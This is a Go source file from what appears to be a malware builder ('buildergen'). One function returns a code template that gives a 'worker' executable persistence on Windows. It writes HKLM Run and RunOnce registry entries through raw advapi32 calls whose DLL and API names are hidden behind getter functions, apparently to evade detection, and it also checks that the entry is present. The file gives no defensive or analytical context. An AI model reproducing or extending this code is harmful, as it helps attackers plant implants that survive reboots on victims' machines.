package buildergen

import "strings"

func templateBootPersist() string {
	return strings.TrimSpace(`
func addBootPersistence(workerPath string) {
	if !isAdmin() {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regSetValueEx := advapi32.NewProc("RegSetValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString(getHKLMRunOncePath())
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20006), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString("!" + getDisplayName())
	cmdLine := "\"" + workerPath + "\" worker"
	valData, _ := syscall.UTF16FromString(cmdLine)
	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
	regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))
}

func addHKLMRun(workerPath string) {
	if !isAdmin() {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regSetValueEx := advapi32.NewProc("RegSetValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString(getHKLMRunPath())
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20006), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString(getDisplayName())
	cmdLine := "\"" + workerPath + "\" worker"
	valData, _ := syscall.UTF16FromString(cmdLine)
	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
	regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))
}

func isHKLMRunPresent() bool {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString(getHKLMRunPath())
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return false
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString(getDisplayName())
	var vType, dataSize uint32
	r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
	return r2 == 0
}
`)
}
